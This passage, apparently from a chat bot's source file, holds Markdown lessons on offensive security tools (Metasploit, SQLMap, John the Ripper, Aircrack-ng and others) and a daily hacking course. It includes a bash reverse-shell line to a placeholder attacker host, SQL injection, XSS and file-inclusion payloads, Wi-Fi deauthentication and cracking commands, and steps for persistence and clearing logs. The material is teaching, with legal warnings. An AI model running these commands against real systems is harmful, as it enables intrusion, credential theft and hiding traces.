                "`set LHOST 192.168.1.10`\n"
                "`exploit`\n\n"

                "🧰 *Popular Modules:*\n"
                "\"- scanners/portscan/tcp\"\n"
                "\"- exploit/multi/handler\"\n"
                "\"- auxiliary/gather/search_email_collector\"\n"
                "\"- post/multi/recon/local_exploit_suggester\"\n\n"

                "📞 *Meterpreter Tips:*\n"
                "\"- `sysinfo`, `getuid`, `shell`\"\n"
                "\"- `screenshot`, `webcam_snap`, `keyscan_start`\"\n"
                "\"- `download`, `upload`, `hashdump`\"\n"
                "\"- `persistence`, `migrate`, `record_mic`\"\n\n"

                "💡 *Pro Tips:*\n"
                "\"- Use `search <term>` to find modules\"\n"
                "\"- Use `info` to see module options\"\n"
                "\"- Use `check` before `exploit` to verify vulnerability\"\n\n"

                "⚠️ *Legal Warning:*\n"
                "Only exploit systems you own or are authorized to test. Unauthorized use of Metasploit is illegal.\n\n"

                "🏁 *Conclusion:*\n"
                "Metasploit is the Swiss Army knife for hackers. Mastering it means mastering exploitation.\n"
                "_Launch payloads, hack ethically._ ⚔️💻",

    "nikto": "*🛡️ Nikto* – Web Server Vulnerability Scanner\n\n"
            "🧠 *What is Nikto?*\n"
            "Nikto is a fast, open-source web server scanner that detects outdated software, security misconfigurations, and vulnerabilities in websites.\n\n"

            "🛠 *Installation:*\n"
            "\"- Kali Linux: Pre-installed\"\n"
            "\"- Ubuntu/Debian: `sudo apt install nikto`\"\n"
            "\"- GitHub: `git clone https://github.com/sullo/nikto.git`\"\n"
            "\"  Run with: `perl nikto.pl -h <host>`\"\n\n"

            "⚙️ *Basic Usage:*\n"
            "`nikto -h http://target.com`\n"
            "`nikto -h 192.168.1.10 -p 8080`\n\n"

            "🎯 *Common Options:*\n"
            "\"- `-h` → Target host\"\n"
            "\"- `-p` → Port number\"\n"
            "\"- `-Tuning` → Specific tests (e.g., XSS, files, injection)\"\n"
            "\"- `-o` → Output to file\"\n"
            "\"- `-ssl` → Force SSL scan\"\n\n"

            "🧪 *Examples:*\n"
            "- Scan for HTTP issues:\n"
            "`nikto -h http://192.168.1.100`\n"
            "- Output report to file:\n"
            "`nikto -h target.com -o scan.txt -Format txt`\n"
            "- Scan HTTPS site:\n"
            "`nikto -h https://secure.site`\n\n"

            "📚 *Finds Issues Like:*\n"
            "\"- Outdated Apache, PHP, IIS versions\"\n"
            "\"- Dangerous files (e.g., admin.php, test.php)\"\n"
            "\"- XSS, SQL error messages, headers issues\"\n"
            "\"- Default credentials, backup files, open directories\"\n\n"

            "💡 *Pro Tips:*\n"
            "\"- Combine with `Burp` for deep testing\"\n"
            "\"- Run behind `proxychains` to anonymize\"\n"
            "\"- Use `-Tuning 123` to focus on injection, XSS, interesting files\"\n\n"

            "⚠️ *Legal Reminder:*\n"
            "Scan only web apps you own or have written permission to test. Scanning others without consent is illegal.\n\n"

            "🏁 *Conclusion:*\n"
            "Nikto is a lightweight but powerful web scanner every ethical hacker should use for quick checks.\n"
            "_Fast, noisy, effective. Scan wisely._ 🌐🔍",

    "sqlmap": "*🕷️ SQLMap* – Automated SQL Injection Tool\n\n"
            "🧠 *What is SQLMap?*\n"
            "SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web apps.\n\n"

            "🛠 *Installation:*\n"
            "\"- Kali Linux: Pre-installed\"\n"
            "\"- GitHub: `git clone https://github.com/sqlmapproject/sqlmap.git`\"\n"
            "\"  Run with: `python3 sqlmap.py`\"\n\n"

            "⚙️ *Basic Usage:*\n"
            "`sqlmap -u \"http://target.com/page.php?id=1\" --batch`\n"
            "Use `--batch` to run without prompts.\n\n"

            "🎯 *Common Options:*\n"
            "\"- `--dbs` → List databases\"\n"
            "\"- `--tables -D <db>` → Show tables in a DB\"\n"
            "\"- `--columns -T <table> -D <db>` → Show columns\"\n"
            "\"- `--dump` → Dump data from a table\"\n"
            "\"- `--os-shell` → Get OS command shell\"\n"
            "\"- `--risk=3 --level=5` → Deep scanning\"\n\n"

            "🧪 *Example Attacks:*\n"
            "- List databases:\n"
            "`sqlmap -u \"http://site.com/item.php?id=2\" --dbs`\n"
            "- Dump users from DB:\n"
            "`sqlmap -u \"http://site.com/p.php?id=2\" -D testdb -T users --dump`\n"
            "- Get SQL shell:\n"
            "`sqlmap -u \"http://vuln.com/x?id=1\" --sql-shell`\n\n"

            "💡 *Advanced Tips:*\n"
            "\"- Use `--random-agent` to avoid detection\"\n"
            "\"- Test cookies with: `--cookie=\"PHPSESSID=xyz\"`\"\n"
            "\"- Use `-p` to target specific parameter\"\n"
            "\"- Use `--tor --check-tor` to anonymize via Tor\"\n\n"

            "📁 *Practical Tasks:*\n"
            "✅ Find SQLi in DVWA or bWAPP\n"
            "✅ Dump users table from test site\n"
            "✅ Try `--os-shell` on vulnerable test app\n\n"

            "⚠️ *Ethical Note:*\n"
            "Only target applications that you have permission to test. Misuse can result in legal consequences.\n\n"

            "🏁 *Conclusion:*\n"
            "SQLMap automates powerful SQL injection attacks and database extraction. Use it wisely, ethically, and legally.\n"
            "_Inject smart. Extract carefully._ 🧠🕳️",

    "john": "*🔧 John the Ripper* – Password Cracking Tool\n\n"
            "🧠 *What is John the Ripper?*\n"
            "John the Ripper (JtR) is an open-source, fast, and powerful password-cracking tool.\n"
            "It supports various hash types (MD5, SHA1, NTLM, etc.) and cracks passwords using dictionary, brute-force, and rule-based attacks.\n\n"

            "🛠 *Installation:*\n"
            "*Debian/Ubuntu:*\n"
            "`sudo apt update && sudo apt install john`\n"
            "*Kali Linux:* Pre-installed\n"
            "*macOS (via Homebrew):*\n"
            "`brew install john-jumbo`\n\n"

            "📦 *Supported Hash Types:*\n"
            "- Unix (/etc/shadow)\n"
            "- Windows LM/NTLM hashes\n"
            "- MD5, SHA1, SHA256, bcrypt, etc.\n"
            "- ZIP/RAR/Office files (with jumbo version)\n\n"

            "🔍 *Basic Usage:*\n"
            "1. Prepare a hash file\n"
            "2. Run John with a wordlist\n"
            "`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`\n"
            "3. View cracked passwords:\n"
            "`john --show hashes.txt`\n\n"

            "🧪 *Extracting Hashes:*\n"
            "- *Linux:* `/etc/shadow` (needs root)\n"
            "`unshadow /etc/passwd /etc/shadow > hashes.txt`\n"
            "- *Windows (SAM/NTLM):* Use `samdump2` or `impacket-secretsdump`\n\n"

            "🎯 *Modes of Cracking:*\n"
            "- *Wordlist (dictionary):*\n"
            "`john --wordlist=rockyou.txt hashes.txt`\n"
            "- *Incremental (brute-force):*\n"
            "`john --incremental hashes.txt`\n"
            "- *Single Mode:* Fastest, uses usernames for guesses\n"
            "`john --single hashes.txt`\n"
            "- *Mask Mode:* Targeted brute-force (e.g., 6-digit pins)\n"
            "`john --mask='?d?d?d?d?d?d' hashes.txt`\n\n"

            "⚙️ *Hash Identification:*\n"
            "Use *`hashid`* or *`hash-identifier`* tools to detect hash type\n"
            "`hashid <hash>`\n\n"

            "🛡️ *Example Hash Formats:*\n"
            "- *MD5:* `5f4dcc3b5aa765d61d8327deb882cf99`\n"
            "- *SHA1:* `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`\n"
            "- *NTLM:* `32ed87bdb5fdc5e9cba88547376818d4`\n\n"

            "📚 *Real-World Scenarios:*\n"
            "1. Crack user passwords from leaked databases\n"
            "2. Crack WPA handshake hashes (converted to JtR format)\n"
            "3. Penetration testing post-exploitation (dump and crack)\n"
            "4. Reverse engineering app password protection\n\n"

            "🎓 *Learn by Doing – Practice Tasks:*\n"
            "✅ Task 1: Crack a basic MD5 hash using rockyou.txt\n"
            "✅ Task 2: Create a custom wordlist and crack your own hash\n"
            "✅ Task 3: Use mask mode to brute-force a 6-digit PIN hash\n"
            "✅ Task 4: Crack a SAM file dump using NTLM hashes\n"
            "✅ Task 5: Try a hybrid attack using rules\n\n"

            "🧠 *Advanced Usage:*\n"
            "- *Custom Rule-Based Cracking:*\n"
            "`john --rules --wordlist=rockyou.txt hashes.txt`\n"
            "- *Restore interrupted session:*\n"
            "`john --restore`\n"
            "- *Save session:*\n"
            "`john --session=myattack --wordlist=rockyou.txt hashes.txt`\n\n"

            "🔐 *Cracked Passwords Location:*\n"
            "`~/.john/john.pot`\n"
            "Use `john --show hashes.txt` to read it\n\n"

            "📂 *Convert Hashes (if needed):*\n"
            "Use `tools/` in Jumbo John build:\n"
            "`zip2john`, `rar2john`, `pdf2john`, `office2john`\n"
            "Example:\n"
            "`zip2john secret.zip > zip.hash`\n"
            "`john --wordlist=rockyou.txt zip.hash`\n\n"

            "🚨 *Ethical Note:*\n"
            "Only crack hashes in legal, educational, or authorized pentest environments.\n"
            "Unauthorized cracking is illegal and unethical.\n\n"

            "🏁 *Conclusion:*\n"
            "John the Ripper is a go-to tool for any ethical hacker or pentester needing to test password strength or crack hashes.\n"
            "_Mastering JtR means mastering password security._ 🔐🔥",

    "mobsf": "*📱 MobSF (Mobile Security Framework)* – Android/iOS App Analyzer\n\n"
            "🧠 *What is MobSF?*\n"
            "MobSF is an automated tool for performing static and dynamic analysis of Android/iOS mobile apps.\n"
            "It helps in identifying vulnerabilities, exposed components, hardcoded secrets, and more.\n\n"

            "🛠 *Installation (Linux):*\n"
            "`sudo apt update && sudo apt install git python3 python3-pip`\n"
            "`git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git`\n"
            "`cd Mobile-Security-Framework-MobSF`\n"
            "`./setup.sh`  or `python3 manage.py runserver`\n\n"

            "🌐 *Access Interface:*\n"
            "After starting server → Open in browser:\n"
            "`http://127.0.0.1:8000`\n\n"

            "📦 *Supported Files:*\n"
            "- `.apk` → Android\n"
            "- `.ipa` → iOS\n"
            "- `.zip` source folders\n\n"

            "🔍 *Static Analysis Features:*\n"
            "- Permissions and manifest analysis\n"
            "- API calls, code review, hardcoded secrets\n"
            "- Malware signatures, insecure components\n\n"

            "🚀 *Dynamic Analysis (Android):*\n"
            "- Uses MobSF Android emulator or your device\n"
            "- Analyze runtime behavior, network calls, dynamic API traces\n"
            "Upload APK and click *Dynamic Analyzer*\n\n"

            "🛡️ *Security Checks:*\n"
            "- WebView exposure\n"
            "- Debuggable apps\n"
            "- Broken cryptography\n"
            "- Insecure storage\n"
            "- Hardcoded API keys and credentials\n\n"

            "📁 *Reports Output:*\n"
            "- HTML or PDF reports generated automatically\n"
            "- Can be exported and saved\n\n"

            "🧪 *Use Case for Hackers:*\n"
            "- Reverse engineering APKs before exploiting\n"
            "- Auditing third-party apps\n"
            "- Malware detection in Android/iOS packages\n\n"

            "🎓 *Practice Tasks:*\n"
            "✅ Upload a known APK like WhatsApp clone\n"
            "✅ Check if it's debuggable or has exposed components\n"
            "✅ Try decompiling an APK with MobSF and locate strings\n"
            "✅ Enable dynamic analysis and inspect API traffic\n\n"

            "🧠 *Pro Tips:*\n"
            "- Use with Genymotion or emulator for better dynamic analysis\n"
            "- Check MobSF logs for deeper insights\n"
            "- Automate using MobSF REST API\n\n"

            "🚨 *Note:*\n"
            "Only analyze apps you own or have permission to audit. Reverse engineering others' APKs without consent may be illegal.\n\n"

            "🏁 *Conclusion:*\n"
            "MobSF is a must-have mobile analysis tool for ethical hackers, bug bounty hunters, and malware researchers.\n"
            "_Secure the app before the attacker breaks it!_ 🛡️📱",

"ghidra": "*🧰 Ghidra* – Reverse Engineering & Malware Analysis Tool\n\n"
        "🧠 *What is Ghidra?*\n"
        "Ghidra is a powerful reverse engineering framework developed by the NSA.\n"
        "It's used to analyze compiled programs (binaries) and detect hidden behavior, malware, and vulnerabilities.\n\n"

        "🛠 *Installation:*\n"
        "1. Download from:\n"
        "[https://ghidra-sre.org](https://ghidra-sre.org)\n"
        "2. Extract the archive\n"
        "3. Run:\n"
        "`./ghidraRun` (Linux/macOS)\n"
        "or\n"
        "`ghidraRun.bat` (Windows)\n\n"

        "📦 *Supported File Types:*\n"
        "- `.exe`, `.bin`, `.elf`, `.so`, `.dll`, `.apk`, firmware dumps\n"
        "- x86, ARM, MIPS, PowerPC architectures\n\n"

        "🔍 *Core Features:*\n"
        "- Disassembler\n"
        "- Decompiler (convert assembly to C-like code)\n"
        "- Binary analysis\n"
        "- Patch editor\n"
        "- Symbolic analysis and graph views\n\n"

        "⚙️ *Workflow Overview:*\n"
        "1. Start Ghidra → Create a project\n"
        "2. Import a binary\n"
        "3. Analyze with default options\n"
        "4. Explore Decompiled Code\n"
        "5. Navigate functions, strings, symbols\n\n"

        "🔐 *Reverse Engineering Tasks:*\n"
        "- Identify malware behavior\n"
        "- Find hardcoded credentials\n"
        "- Analyze control flow and function logic\n"
        "- Patch binary logic\n"
        "- Study obfuscation & encryption routines\n\n"

        "🎯 *Use Cases:*\n"
        "- Malware reverse engineering\n"
        "- Exploit development\n"
        "- CTF/Forensics challenges\n"
        "- Security research\n\n"

        "🎓 *Practice Tasks:*\n"
        "✅ Import a simple C-compiled binary and inspect the `main()`\n"
        "✅ Use `Search → Strings` to locate hints\n"
        "✅ Follow assembly flow using decompiler\n"
        "✅ Modify hex data or patch functions\n"
        "✅ Try analyzing a crackme file (from crackmes.one)\n\n"

        "🧠 *Advanced Tips:*\n"
        "- Use bookmarks to mark functions\n"
        "- Rename variables for easier tracking\n"
        "- Use *Function Graph View* for control flow analysis\n"
        "- Integrate Python scripts for automation\n\n"

        "📁 *Export Features:*\n"
        "- Export decompiled code\n"
        "- Save custom reports\n"
        "- Create binary patches\n\n"

        "🚨 *Ethical Warning:*\n"
        "Ghidra is for RESEARCH & LEGAL use only. Use it only on binaries you’re authorized to analyze.\n\n"

        "🏁 *Conclusion:*\n"
        "Ghidra is a world-class reverse engineering suite for dissecting and understanding binaries. With powerful analysis tools, it rivals commercial RE tools like IDA Pro.\n"
        "_Reverse like a pro with Ghidra!_ 🧠💻",

    "aircrackng": "*📡 Aircrack-ng* – Wi-Fi Cracking & Wireless Security Suite\n\n"
        "🧠 *What is Aircrack-ng?*\n"
        "Aircrack-ng is a complete suite of tools to assess Wi-Fi network security.\n"
        "It allows packet capturing, deauthentication, handshake capture, and cracking WEP/WPA/WPA2 keys.\n\n"

        "🛠 *Installation:*\n"
        "*Kali Linux:* Pre-installed\n"
        "*Ubuntu/Debian:*\n"
        "`sudo apt update && sudo apt install aircrack-ng`\n"
        "*macOS (via Homebrew):*\n"
        "`brew install aircrack-ng`\n\n"

        "📦 *Tools Included:*\n"
        "- `airmon-ng`: Enables monitor mode\n"
        "- `airodump-ng`: Captures packets & handshakes\n"
        "- `aireplay-ng`: Injects/deauths packets\n"
        "- `aircrack-ng`: Cracks captured handshakes\n\n"

        "📡 *Monitor Mode Setup:*\n"
        "Enable monitor mode on your Wi-Fi card:\n"
        "`sudo airmon-ng check kill`\n"
        "`sudo airmon-ng start wlan0`\n"
        "Interface changes to `wlan0mon`\n\n"

        "🔍 *Capture Handshake:*\n"
        "1. Run airodump-ng:\n"
        "`sudo airodump-ng wlan0mon`\n"
        "2. Note target BSSID and channel (CH)\n"
        "3. Capture handshake:\n"
        "`sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon`\n"
        "4. Deauthenticate client:\n"
        "`sudo aireplay-ng -0 10 -a <BSSID> wlan0mon`\n\n"

        "💥 *Crack the Handshake:*\n"
        "`aircrack-ng -w rockyou.txt capture.cap`\n"
        "Requires handshake in `.cap` file and a good wordlist\n\n"

        "🎯 *Wordlists for Cracking:*\n"
        "- `/usr/share/wordlists/rockyou.txt`\n"
        "- Use `crunch`, `cewl`, or `cupp` to create custom wordlists\n\n"

        "🔐 *WEP Cracking (Old networks):*\n"
        "1. Capture IV packets using airodump-ng\n"
        "2. Use aireplay-ng to inject packets:\n"
        "`aireplay-ng -3 -b <BSSID> wlan0mon`\n"
        "3. Crack with:\n"
        "`aircrack-ng wep.cap`\n\n"

        "📚 *Real-World Practice:*\n"
        "✅ Practice on your own router or with tools like *Wi-Fi Pumpkin*, *Fluxion*, or a test lab.\n"
        "✅ Use `wifite` to automate the process\n"
        "✅ Analyze captured packets with Wireshark\n\n"

        "🧠 *Pro Tips:*\n"
        "- Use a compatible Wi-Fi adapter that supports monitor mode and injection (e.g., Alfa AWUS036NHA)\n"
        "- Place antenna close to the target for better signal\n"
        "- Use channel locking in airodump-ng to avoid missing handshake\n\n"

        "⚠️ *Legal Warning:*\n"
        "Never use Aircrack-ng on networks you don't own or have permission to test. Unauthorized access is illegal and unethical.\n\n"

        "🏁 *Conclusion:*\n"
        "Aircrack-ng is a powerful wireless auditing toolset used by ethical hackers to test Wi-Fi security. Mastering it gives you deep insights into wireless networks and their weaknesses.\n"
        "_Capture the handshake, crack the code!_ 📶🔓",

    "career": "*📈 Career & Certifications:*\n\nChoose a sub-topic below to explore your future in ethical hacking:",

    "why_career": "*Why Choose Ethical Hacking?*\n\nEthical hacking is a high-demand skill in the cybersecurity industry. With increasing cyber threats, companies actively hire professionals to secure systems, detect vulnerabilities, and prevent data breaches.\n\nBenefits:\n- High salary potential\n- Job satisfaction from solving critical problems\n- Global career opportunities\n- Continuous learning and challenge",

    "certs": "*Top Ethical Hacking Certifications:*\n\n1. CEH (Certified Ethical Hacker)\n2. OSCP (Offensive Security Certified Professional)\n3. CompTIA Security+\n4. CISSP (Certified Information Systems Security Professional)\n5. eJPT (eLearnSecurity Junior Penetration Tester)\n6. GPEN (GIAC Penetration Tester)\n\nThese validate your skills in ethical hacking, penetration testing, and network defense.",

    "roadmap": "*Roadmap to Become an Ethical Hacker:*\n\n1. Learn networking basics (TCP/IP, ports, protocols)\n2. Get comfortable with Linux & terminal\n3. Understand cybersecurity concepts\n4. Learn programming (Python recommended)\n5. Study tools like Nmap, Wireshark, Metasploit\n6. Practice on platforms like Hack The Box, TryHackMe\n7. Get certified (e.g., CEH, OSCP)\n8. Start freelancing or apply for entry-level security roles",

    "jobs": "*Job Roles & Salaries:*\n\n- 🔍 Penetration Tester: ₹6–20 LPA\n- 🔐 Security Analyst: ₹5–15 LPA\n- 🧠 Security Consultant: ₹8–25 LPA\n- 🕵️ Ethical Hacker: ₹5–18 LPA\n- 👨‍💻 Security Researcher: ₹6–22 LPA\n\nSalaries vary by skill level, certifications, and experience. Freelance ethical hackers can also earn through bug bounty programs (e.g., HackerOne, Bugcrowd).",

    "career_tips": "*Career Tips & Resources:*\n\n- Stay updated with sites like Hacker News, Cybrary, and Exploit-DB\n- Practice on labs: TryHackMe, Hack The Box, PortSwigger Labs\n- Build a portfolio (GitHub, LinkedIn)\n- Contribute to open source security tools\n- Network with professionals via conferences & Discord communities\n- Keep learning—cybersecurity evolves fast!",

    "day1": "*📅 Day 1: Introduction to Ethical Hacking & Lab Setup*\n\n"
    "Welcome to your hacking journey! Let's begin by understanding what ethical hacking is and how to set up a safe environment for practice.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Ethical Hacking\n"
    "- Black Hat vs White Hat Hackers\n"
    "- Setting Up Kali Linux in VirtualBox\n"
    "- Updating & Upgrading Kali Linux\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Download VirtualBox and Kali Linux ISO\n"
    "2. Create a VM and install Kali Linux\n"
    "3. Run `sudo apt update && sudo apt upgrade`\n"
    "4. Explore basic terminal: `ls`, `pwd`, `clear`, `whoami`\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Introduction to Ethical Hacking](https://youtu.be/3HjAwJ8PfIs?si=GPWl7TwGr2o5uZ21)\n"
    " [Black Hat vs White Hat Hackers](https://youtu.be/8C9HmCnoV0E?si=SKYIjEZXWF0U2yMU)\n"
    " [Setting Up Kali Linux in VirtualBox](https://youtu.be/DfX5MB-zXEM?si=2jsbz8-Ce2bu15HF)\n\n"
    "*✅ Outcome:* Kali Linux VM is set up and ready for use.",

  "day2": "*📅 Day 2: Networking Essentials for Hackers*\n\n"
    "Understanding how devices talk over the network is critical.\n\n"
    "*🧠 Topics Covered:*\n"
    "- OSI vs TCP/IP Model\n"
    "- MAC, IP, Subnet, Ports\n"
    "- Common Services: DNS, DHCP, HTTP, FTP\n"
    "- Private vs Public IP\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Run `ifconfig` / `ip a` to view IP\n"
    "2. Use `ping`, `traceroute`, `netstat`, `nslookup`\n"
    "3. Use `nmap` to scan your own system: `nmap 127.0.0.1`\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Networking Essentials for Hackers](https://youtu.be/xzGeiguILy8?si=GecBL6_EkyC9Z47d)\n\n"
    "*✅ Outcome:* Able to analyze basic networking structure and run basic diagnostic commands.",

  "day3": "*📅 Day 3: Linux Basics for Hackers*\n\n"
    "Linux is a hacker’s favorite OS. Get comfortable with terminal usage.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Linux Directory Structure (/etc, /var, /usr)\n"
    "- File Management: `cd`, `ls`, `mkdir`, `rm`\n"
    "- Permissions: `chmod`, `chown`\n"
    "- Piping and Redirection: `|`, `>`\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Navigate folders using `cd`, `ls -la`\n"
    "2. Create and delete files with `touch`, `rm -rf`\n"
    "3. Change file permissions: `chmod +x script.sh`\n"
    "4. Combine commands: `cat file.txt | grep 'admin'`\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Linux Basics for Hackers](https://youtu.be/PhYmmD84oFY?si=i2ggx3NdzXZZL4kq)\n\n"
    "*✅ Outcome:* Comfortable with navigating and modifying Linux files via terminal.",

  "day4": "*📅 Day 4: Bash Scripting & Automation*\n\n"
    "Automation helps hackers save time. Today we’ll write basic bash scripts.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Bash\n"
    "- Writing a simple bash script\n"
    "- Variables and conditions\n"
    "- For & While Loops\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Write a script to scan IPs using ping:\n"
    "```bash\n"
    "#!/bin/bash\n"
    "for ip in {1..10}; do\n"
    "  ping -c 1 192.168.0.$ip\n"
    "done\n"
    "```\n"
    "2. Automate backup of files\n"
    "3. Use `crontab` to schedule a script\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Bash Scripting & Automation](https://youtu.be/CeCah9nD9XE?si=AYk7mkZ4gM2nmZVP)\n\n"
    "*✅ Outcome:* Able to write and execute custom bash scripts.",

  "day5": "*📅 Day 5: Footprinting and Reconnaissance*\n\n"
    "Recon is the first step in hacking. It involves collecting data about the target.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Passive vs Active Recon\n"
    "- WHOIS, DNS Records\n"
    "- Google Dorking\n"
    "- Social Engineering Basics\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `whois example.com`\n"
    "2. Use `nslookup`, `dig`, `host`\n"
    "3. Practice Google Dorking: `site:example.com intitle:login`\n"
    "4. Install and try `theHarvester`\n"
    "```bash\n"
    "theHarvester -d example.com -l 100 -b google\n"
    "```\n\n"
    "*✅ Outcome:* You can collect basic intelligence about your targets.",

  "day6": "*📅 Day 6: Scanning & Enumeration*\n\n"
    "Learn how to actively scan targets and enumerate useful information.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of Scans (SYN, TCP, UDP)\n"
    "- Enumeration Techniques\n"
    "- Banner Grabbing\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `nmap -sS -sV target_ip`\n"
    "2. Use `enum4linux` for SMB Enumeration\n"
    "3. Banner grabbing with `telnet`, `netcat`, or `nmap`\n\n"
    "*✅ Outcome:* Able to perform active scans and extract enumeration data.",

      "day7": "*📅 Day 7: Vulnerability Scanning*\n\n"
    "Vulnerabilities are weaknesses. Today we’ll learn to find them.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Vulnerability Scanning\n"
    "- Types of Vulnerabilities\n"
    "- Tools: Nessus, OpenVAS\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install Nessus on Kali Linux\n"
    "2. Scan local host for vulnerabilities\n"
    "3. Analyze a report and identify CVEs\n\n"
    "*✅ Outcome:* Able to run a vulnerability scan and understand the results.",

  "day8": "*📅 Day 8: Exploitation Basics with Metasploit*\n\n"
    "Let’s use Metasploit to understand how vulnerabilities are exploited.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Metasploit\n"
    "- msfconsole Basics\n"
    "- Exploit Modules & Payloads\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Start Metasploit: `msfconsole`\n"
    "2. Search & run a simple exploit: `exploit/windows/smb/ms08_067_netapi`\n"
    "3. Use `set payload` & `set RHOST`\n\n"
    "*✅ Outcome:* Able to execute a basic exploit using Metasploit.",

  "day9": "*📅 Day 9: Exploiting Web Applications (SQL Injection)*\n\n"
    "Web apps are full of juicy targets. We’ll start with SQLi.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Introduction to SQL Injection\n"
    "- Finding injectable parameters\n"
    "- Manual SQLi Techniques\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Set up DVWA (Damn Vulnerable Web App)\n"
    "2. Use `' OR 1=1 --` and `' UNION SELECT` payloads\n"
    "3. Extract DB names using error-based SQLi\n\n"
    "*✅ Outcome:* You can find and test SQLi vulnerabilities.",

  "day10": "*📅 Day 10: XSS (Cross Site Scripting)*\n\n"
    "XSS allows attackers to run scripts in users' browsers.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of XSS: Reflected, Stored, DOM\n"
    "- Common payloads\n"
    "- Bypassing filters\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use DVWA or bwapp for practice\n"
    "2. Inject `<script>alert(1)</script>`\n"
    "3. Use `document.cookie` to demonstrate cookie theft\n\n"
    "*✅ Outcome:* Understand XSS and how to detect/test it.",

    "day11": "*📅 Day 11: File Inclusion Vulnerabilities (LFI/RFI)*\n\n"
    "File inclusion flaws can give access to system files or remote code.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is LFI and RFI\n"
    "- Directory traversal\n"
    "- Practical Payloads\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Setup DVWA or a vulnerable server\n"
    "2. Try LFI using `?page=../../../../etc/passwd`\n"
    "3. Demonstrate RFI if allowed with external file\n\n"
    "*✅ Outcome:* Able to test for and exploit file inclusion issues.",

  "day12": "*📅 Day 12: Command Injection & Remote Code Execution (RCE)*\n\n"
    "Gain shell access by injecting system-level commands.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Command Injection vs RCE\n"
    "- Indicators of Vulnerability\n"
    "- Practical Exploits\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Identify vulnerable forms (e.g., ping, name fields)\n"
    "2. Inject commands like `; id` or `| whoami`\n"
    "3. Setup a Netcat listener to capture shell\n\n"
    "*✅ Outcome:* Able to identify and exploit command injection flaws.",

  "day13": "*📅 Day 13: Privilege Escalation Basics*\n\n"
    "After exploitation, elevate privileges for deeper control.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of Privilege Escalation (Vertical & Horizontal)\n"
    "- Linux & Windows PrivEsc Techniques\n"
    "- Common misconfigurations\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `sudo -l` or weak SUID binaries\n"
    "2. Use `winPEAS` and `linPEAS` enumeration tools\n"
    "3. Exploit kernel or permission issues\n\n"
    "*✅ Outcome:* Understand and perform privilege escalation.",

  "day14": "*📅 Day 14: Password Cracking*\n\n"
    "Learn how attackers break passwords and how to protect them.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Hashes vs Encryption\n"
    "- Dictionary & Brute Force Attacks\n"
    "- Tools: JohnTheRipper, Hashcat\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `john` to crack `/etc/shadow` sample\n"
    "2. Use `hashid` to identify hash types\n"
    "3. Try a bruteforce with `hydra` on SSH\n\n"
    "*✅ Outcome:* Familiar with cracking tools and password security.",

  "day15": "*📅 Day 15: Wireless Hacking Basics (WiFi)*\n\n"
    "Targeting wireless networks opens up a lot of possibilities.\n\n"
    "*🧠 Topics Covered:*\n"
    "- WiFi encryption (WEP/WPA/WPA2)\n"
    "- Monitor & Packet Injection\n"
    "- Tools: Airmon-ng, Airodump-ng, Aircrack-ng\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Enable monitor mode: `airmon-ng start wlan0`\n"
    "2. Capture handshake: `airodump-ng wlan0mon`\n"
    "3. Crack handshake with `aircrack-ng` + wordlist\n\n"
    "*✅ Outcome:* Able to analyze WiFi traffic and attempt WEP/WPA crack.",

      "day16": "*📅 Day 16: Reverse Shells*\n\n"
    "Learn how to gain remote access to a compromised system.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is a reverse shell\n"
    "- TCP vs HTTP reverse shell\n"
    "- Tools: Netcat, Bash, PHP, Python\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Start a Netcat listener: `nc -lvnp 4444`\n"
    "2. Trigger a reverse shell from target: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`\n"
    "3. Try reverse shell payloads in PHP/Python\n\n"
    "*✅ Outcome:* Can execute reverse shells and receive connections.",

  "day17": "*📅 Day 17: Post Exploitation Basics*\n\n"
    "After access, what’s next? Learn how to maintain and leverage access.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Collecting information (credentials, users, history)\n"
    "- Persistence Techniques\n"
    "- Cleaning up traces\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `cat /etc/passwd`, `who`, `history`, `netstat`\n"
    "2. Add a new user to keep access\n"
    "3. Remove logs using `> ~/.bash_history`\n\n"
    "*✅ Outcome:* Able to operate and maintain access after exploitation.",

  "day18": "*📅 Day 18: Web Shells and PHP Exploits*\n\n"
    "Use web shells to control a vulnerable web server.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Web shell basics (PHP/ASP)\n"
    "- Common upload vulnerabilities\n"
    "- Tools: Weevely, b374k\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Upload a web shell to DVWA\n"
